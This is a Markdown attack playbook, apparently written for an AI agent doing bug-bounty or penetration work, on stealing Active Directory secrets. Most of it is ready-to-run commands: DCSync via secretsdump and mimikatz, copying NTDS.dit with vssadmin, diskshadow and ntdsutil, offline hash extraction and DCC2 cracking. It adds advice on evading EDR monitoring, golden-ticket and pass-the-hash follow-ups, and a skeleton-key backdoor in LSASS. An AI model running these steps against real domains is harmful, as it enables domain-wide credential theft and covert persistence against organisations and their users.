---
technology: "NTDS.dit / DC secrets"
kind: bug-bounty-methodology
audience: ai-agent
family: directory-services
version: "1.0"
provenance: "corpus-mined (40 machines; local-SAM-only secretsdump users (4 files) are tracked by [[windows-secrets]]) + upstream-verified: impacket secretsdump.py source (methods and flags), Microsoft AD-schema extended-right pages (GUIDs), learn.microsoft ntdsutil IFM page, hashcat v8 example-hash table (2100 DCC2 / 1000 NTLM). Lab-safe placeholders throughout. Verified 2026-11-12. Supplement 2026-11-13: source: six2dez/pentest-book (post-exploitation/windows/README.md and ad/README.md, no license — rewritten with attribution), accessed 2026-11-13; adds the SeBackupPrivilege route, LM-era filter, skeleton-key endgame note."
---

# NTDS.dit bug bounty methodology

Target model: AD domain EXAMPLE.COM, DC dc01.example.com (198.51.100.10); foothold
ranges from "replication rights via ACL abuse" to "admin on the DC" to "a backup
share". Companion overview: [[ntds|NTDS.dit / DC secrets]]. Cross-units: the rights
that gate DCSync are read via [[ldap-ad]] and abused per [[ad-acl]]; harvested hashes
feed [[ntlm]] (pass-the-hash) and [[kerberos]] (krbtgt → golden ticket).

## Triage table

| Surface | Gate | Min privilege | Payoff |
|---|---|---|---|
| DCSync (secretsdump -just-dc) | DS-Replication-Get-Changes + Get-Changes-All | those extended rights (DA/EA or ACL-granted) | every hash/key in the domain |
| DCSync (mimikatz lsadump::dcsync) | same rights, from Windows | same | same, per-account targeted |
| VSS snapshot theft (vssadmin) | admin/SYSTEM on DC | local admin on DC | locked NTDS.dit copy |
| diskshadow script theft | admin/SYSTEM on DC | local admin on DC | same, scriptable when vssadmin is watched |
| ntdsutil IFM | admin on DC | Administrator on DC | DIT+hives archive, built-in tool |
| Backup theft | read on backup store | whatever reads the share | DIT+SYSTEM+SECURITY offline |
| Offline secretsdump | files in hand | none (offline) | NT hashes, Kerberos keys, LSA secrets |
| Credential cache (DCC2) | SECURITY hive from any member host | SYSTEM on that host | slow-crack domain creds (hashcat 2100) |

Phase order: 0 rights audit → 1 DCSync (preferred) → 2 file theft → 3 offline
extraction → 4 credential-cache chain → 5 endgame use.

## Phase 0 — Audit what you actually hold

Check the effective ACL on the domain NC for your principal (via [[ad-acl]]
tooling — or raw LDAP GUID join in [[ldap-ad]]): the two extended rights that
gate everything here, verified from Microsoft's AD-schema pages:

- `DS-Replication-Get-Changes` — display "Replicating Directory Changes" —
  Rights-GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
- `DS-Replication-Get-Changes-All` — display "Replicating Directory Changes
  All", described as "allows the replication of secret domain data" —
  Rights-GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`

Holding both ⇒ DCSync. Holding neither ⇒ you need DC-local admin (Phase 2) or a
backup (Phase 2c). BloodHound marks these edges for you.

## Phase 1 — DCSync (no code on the DC)

```bash
# whole-domain dump, NTLM session (field-common)
impacket-secretsdump example.com/user:'Password123!'@198.51.100.10 -just-dc

# one account (the classic: krbtgt or Administrator — field-observed)
impacket-secretsdump example.com/user:'Password123!'@198.51.100.10 -just-dc-user krbtgt

# Kerberos session (NTLM-blocked estates)
KRB5CCNAME=admin.ccache impacket-secretsdump -k -no-pass example.com -just-dc-user Administrator

# Windows-side equivalent (observed: earlier-era engagements)
mimikatz # lsadump::dcsync /domain:example.com /dc:dc01.example.com /user:EXAMPLE\krbtgt
```

Expected output: `[*] Using the DRSUAPI method to get NTDS.DIT secrets`, then
per-account lines `EXAMPLE\user:1103:aad3b…:31d6f…:::` (RID:LM:NT). The
`-just-dc-ntlm` form drops Kerberos keys; default output includes AES keys
(usable for [[kerberos]] overpass-the-hash / forgery).

Decision point: failure `session_error`/access-denied means rights are absent —
do NOT retry; audit the ACL instead ([[ad-acl]] — owneredit/daclrestore-style
paths can grant them).

## Phase 2 — File theft (admin on the DC)

The DIT is locked by LSASS; every method below manufactures a consistent copy.

```powershell
# 2a. vssadmin (legacy default — the vssadmin-create-shadow family)
vssadmin create shadow /for=C:
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\temp\ntds.dit
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\temp\SYSTEM

# 2b. diskshadow (scriptable when vssadmin is monitored — field-observed)
#   shadow.script:
#     set context persistent
#     set metadata C:\temp\meta.cab
#     begin backup
#     add volume C: alias myshadow
#     create
#     expose %myshadow% S:
#     end backup
diskshadow /s shadow.script
robocopy S:\Windows\NTDS C:\temp ntds.dit
robocopy S:\Windows\System32\config C:\temp SYSTEM SECURITY

# 2c. ntdsutil IFM — the built-in packager
ntdsutil
  activate instance ntds
  ifm
  create full C:\temp\ifm
#   → C:\temp\ifm\Active Directory\ntds.dit + registry\SYSTEM (+SECURITY)

# 2d. reg save for the hives (any of the above still needs these if not in the set)
reg save hklm\system C:\temp\SYSTEM
reg save hklm\security C:\temp\SECURITY
```

**2e. Backup theft (no DC access at all).** Hunt backup stores for the same
three files inside archives (observed shapes: a
`Support/Backups/Active Directory/ntds.dit` path; a browsable backup folder tree;
a `sam,system,ntds.dit -dest dump.zip` zip). A DIT+SYSTEM pair from
yesterday's backup is as good as today's.

## Phase 3 — Offline extraction

```bash
# full local parse
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL
#   LOCAL mode requires SYSTEM (or -bootkey) — verified from the secretsdump source
#   output: [*] Reading and decrypting hashes from ntds.dit

# just the DIT (no LSA secrets)
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL

# sqlite tooling for targeted browsing (observed: ntdsdotsqlite)
```

Why SYSTEM is mandatory: the DIT's secrets are encrypted with keys derived from
the **bootkey (SYSKEY)** stored in the SYSTEM hive — Microsoft's own ADDSDeployment
still carries the `-installationmediapath` + `-syskey` parameter pair for
IFM-based installs, a living reminder that the pair travels together.

Expected outputs: NT hashes (`user:1103:aad3b…:nt…:::`), Kerberos AES keys
(`aes256-hmac-sha384-…`), NTLM/SPN cleartext secrets in `[*] $MACHINE.ACC`,
gMSA passwords (`gMSA` lines — `gservice:_gmsa_<hex>:::`), LSA secrets
(DCC cache, trust keys) from the SECURITY hive.

## Phase 4 — Credential-cache chain (member hosts)

Any member host's SECURITY hive (reg save / secretsdump remote) carries the
last-logon **domain cached credentials (DCC2)** — verified in the secretsdump
source as "LSA Secrets (including cached creds)".

```bash
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL | grep DCC
#   hash shape: $DCC2$1024#username#saltedhash
hashcat -m 2100 dcc.txt /usr/share/wordlists/rockyou.txt   # DCC2 MS Cache 2 — verified mode
```

hashcat 2100 is deliberately slow (username-salted, 1024 iterations by format
definition in the hash string) — crack selectively (high-value names only),
and note DCC2 hashes cannot be passed or relayed; they only crack.

## Phase 5 — Endgame use of the haul

- Administrator NT hash → pass-the-hash over SMB/WinRM ([[ntlm]]; observed: the
  closing move of most files in this unit).
- `krbtgt` hash/AES key → golden ticket / forged TGT ([[kerberos]]).
- Machine-account hashes → DCSync from "computer" contexts, delegation chains.
- Trust keys → inter-forest ticket forgery ([[kerberos]]).
- gMSA passwords → service-account compromise without ever reading LDAP again.
- `-history` flag (verified from source) dumps *previous* password hashes —
  password-rotation survivors live there.

## Decision points recap

- Rights say no, host says yes → Phase 2 (snapshot/IFM) not Phase 1.
- EDR watches vssadmin → diskshadow script or IFM (field-observed move).
- No DC access at all → backup hunting (2e) before anything invasive.
- NTLM blocked (signing/relay hardening) → DCSync rides Kerberos fine (-k).
- Only a member-host shell → Phase 4 cache chain while you work the domain path.

## Tool map (prose)

impacket secretsdump (remote DRSUAPI, remote VSS, offline LOCAL — the field's
universal tool), ntdsutil/diskshadow/vssadmin/robocopy/reg (native DC-side
packaging), mimikatz lsadump::dcsync (Windows-side replication), ntdsdotsqlite
(offline DIT browsing), hashcat mode 2100 (DCC2) and 1000 (raw NT), Get-GPPPassword
is *not* here — GPP secrets live in [[gpo]]. Local SAM dumps (secretsdump on SAM
hives alone) belong to [[windows-secrets]].

## Supplement (2026-11-13) — deltas from six2dez/pentest-book

Rewritten from six2dez/pentest-book (`post-exploitation/windows/README.md` + `ad/README.md`, no license — rewritten with attribution), accessed 2026-11-13. Diff-first: DCSync, the VSS/diskshadow/IFM theft set, offline extraction, DCC2 and the endgame uses were already documented — three deltas below. (The source also claims "dcsync requires 3 permissions"; the two extended rights in Phase 0 are the documented pair — a third, Get-Changes-In-Filtered-Set, only matters for objects hidden behind a filtered attribute set.)

**S1. Backup Operators can ship the DIT without being admins.** Membership in Backup Operators (or holding SeBackupPrivilege alone) is its own Phase 2 route: the privilege lets its holder back up ANY file regardless of ACL. The classic shape on a DC: `diskshadow` script (Phase 2b) to snapshot, then `robocopy /b S:\Windows\NTDS C:\temp ntds.dit` — the `/b` (backup mode) flag is what exercises the privilege — plus `reg save` for the SYSTEM hive. Local logon on the DC (RDP/interactive) is the practical gate; pair with SeRestorePrivilege holders, who can overwrite protected files on the same box.

**S2. LM-era accounts in the dump.** When a dump line still carries a populated LM hash, the account's password is (a) from a pre-modern policy era and (b) trivially recoverable — LM hashes crack to 7-character halves in seconds. Filter them straight out of Phase 3 output: keep every line whose LM field is NOT the empty-lm constant (`aad3b435b51404eeaad3b435b51404ee`); what remains is the quick-win list before any expensive NT cracking.

**S3. Skeleton key — persistence ON the DC, not just extraction.** With SYSTEM on a DC, mimikatz `misc::skeleton` patches LSASS to accept the password "mimikatz" for ANY account while real passwords keep working — instant domain-wide backdoor, gone at reboot (re-inject to persist). It is the post-dump move when the engagement goal is access instead of hash inventory; detection-side, it forces Kerberos downgrade behavior (RC4 appearing in an AES estate), which the report should note as the tell.
